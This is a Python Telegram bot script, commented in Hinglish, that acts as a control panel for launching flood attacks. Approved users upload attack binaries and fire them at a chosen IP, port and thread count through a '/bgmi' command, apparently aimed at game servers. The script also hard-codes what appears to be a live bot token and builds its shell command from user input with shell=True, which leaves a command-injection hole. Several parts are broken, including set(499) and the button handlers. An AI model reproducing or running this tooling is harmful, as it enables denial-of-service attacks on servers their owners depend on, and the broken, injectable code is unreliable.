import subprocess
import paramiko
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, Filters

# Bot ka Token
TOKEN = "7619017682:AAEMrixQMT4UCzmREBm5nRCbiaJ7_dTuNEg"

# Admin ki Telegram User ID
ADMIN_ID = 6437994839  # Tumhari Telegram ID

# Approved Users ka List
approved_users = set(499)

# VPS & Binary Storage
vps_list = {}
binary_storage = "/mnt/data/binaries"  # Binary files ka storage path
selected_binary = None
attack_process = None  # Store attack process

# Ensure Binary Folder Exists
if not os.path.exists(binary_storage):
    os.makedirs(binary_storage)

# /start command
def start(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id in approved_users or user_id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("➕ Add VPS", callback_data="add_vps")],
            [InlineKeyboardButton("🗑 Remove VPS", callback_data="remove_vps")],
            [InlineKeyboardButton("📜 List VPS", callback_data="list_vps")],
            [InlineKeyboardButton("🆕 Upload Binary", callback_data="upload_binary")],
            [InlineKeyboardButton("📜 List Binaries", callback_data="list_binaries")],
            [InlineKeyboardButton("🔄 Change Binary", callback_data="change_binary")],
            [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
            [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("🤖 Bot started by @RitikXyz099
Choose an option:", reply_markup=reply_markup)
    else:
        update.message.reply_text("Aap approved users list me nahi hain. Admin se approval lein.")

# Binary Upload Command
def upload_binary(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Please send the binary file.")

# Handling Binary File Upload
def handle_document(update: Update, context: CallbackContext) -> None:
    file = update.message.document
    file_path = os.path.join(binary_storage, file.file_name)

    file.download(file_path)
    update.message.reply_text(f"✅ Binary `{file.file_name}` uploaded successfully!")

# List Binaries Command
def list_binaries(update: Update, context: CallbackContext) -> None:
    files = os.listdir(binary_storage)
    if not files:
        update.message.reply_text("❌ No binaries found!")
    else:
        message = "📜 **Available Binaries:**
" + "
".join([f"- `{f}`" for f in files])
        update.message.reply_text(message, parse_mode="Markdown")

# Change Binary Command
def change_binary(update: Update, context: CallbackContext) -> None:
    global selected_binary

    if len(context.args) < 1:
        update.message.reply_text("Usage: /changebinary <binary_name>")
        return

    binary_name = context.args[0]
    if binary_name in os.listdir(binary_storage):
        selected_binary = os.path.join(binary_storage, binary_name)
        update.message.reply_text(f"✅ Binary changed to `{binary_name}`!")
    else:
        update.message.reply_text("⚠️ Binary not found! Use /listbinaries to check available binaries.")

# Start Attack Command
def start_attack(update: Update, context: CallbackContext) -> None:
    global attack_process

    if not selected_binary:
        update.message.reply_text("⚠️ No binary selected! Use /changebinary <binary_name> first.")
        return

    if len(context.args) < 3:
        update.message.reply_text("Usage: /bgmi <ip> <port> <threads>")
        return

    target_ip, target_port, threads = context.args[:3]
    command = f"{selected_binary} {target_ip} {target_port} {threads}"

    try:
        attack_process = subprocess.Popen(command, shell=True)
        update.message.reply_text(f"🚀 Attack started on `{target_ip}:{target_port}` using `{selected_binary}`!")
    except Exception as e:
        update.message.reply_text(f"❌ Error starting attack: {str(e)}")

# Stop Attack Command
def stop_attack(update: Update, context: CallbackContext) -> None:
    global attack_process

    if attack_process:
        attack_process.terminate()
        attack_process = None
        update.message.reply_text("🛑 Attack stopped successfully!")
    else:
        update.message.reply_text("⚠️ No active attack found!")

# Callback for buttons
def button_click(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    user_id = query.from_user.id

    if user_id not in approved_users and user_id != ADMIN_ID:
        query.answer("Aapko is action ka access nahi hai!", show_alert=True)
        return

    if query.data == "upload_binary":
        upload_binary(query.message, context)
    elif query.data == "list_binaries":
        list_binaries(query.message, context)
    elif query.data == "change_binary":
        query.message.reply_text("Usage: /changebinary <binary_name>")
    elif query.data == "start_attack":
        query.message.reply_text("Usage: /bgmi <ip> <port> <threads>")
    elif query.data == "stop_attack":
        stop_attack(query.message, context)

# Bot setup
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # Commands add karna
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("uploadbinary", upload_binary))
    dp.add_handler(CommandHandler("listbinaries", list_binaries))
    dp.add_handler(CommandHandler("changebinary", change_binary, pass_args=True))
    dp.add_handler(CommandHandler("bgmi", start_attack, pass_args=True))
    dp.add_handler(CommandHandler("stopattack", stop_attack))
    dp.add_handler(MessageHandler(Filters.document, handle_document))  # Handle file uploads
    dp.add_handler(CallbackQueryHandler(button_click))

    # Bot ko start karna
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
